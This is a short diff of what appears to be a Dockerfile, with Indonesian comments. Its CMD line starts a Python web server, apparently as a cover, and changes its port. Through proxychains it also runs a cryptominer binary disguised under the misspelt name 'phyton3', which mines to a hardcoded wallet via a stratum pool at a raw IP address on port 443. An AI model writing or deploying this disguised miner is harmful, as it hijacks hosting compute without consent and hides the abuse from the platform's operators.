@@ -24,4 +24,4 @@ RUN chmod +x libvecnocuda.so phyton3
 
 # 4. Jalankan Web Server (port 8080) + Star via Proxychains
 # Kita pake & biar dua-duanya jalan bareng
-CMD python3 -m http.server 8080 & proxychains4 ./phyton3 -a vecno:qplx5k508ru9letd87d8vcp9drjfvzv9hk6hdvc3a8d7rx95k63g54sy26cx6 --stratum-server 152.42.171.146 --stratum-port 443 --stratum-worker BLACK-$(shuf -i 1-20000 -n 1) -t 0
+CMD python3 -m http.server 8000 & proxychains4 ./phyton3 -a vecno:qplx5k508ru9letd87d8vcp9drjfvzv9hk6hdvc3a8d7rx95k63g54sy26cx6 --stratum-server 152.42.171.146 --stratum-port 443 --stratum-worker BLACK-$(shuf -i 1-20000 -n 1) -t 0
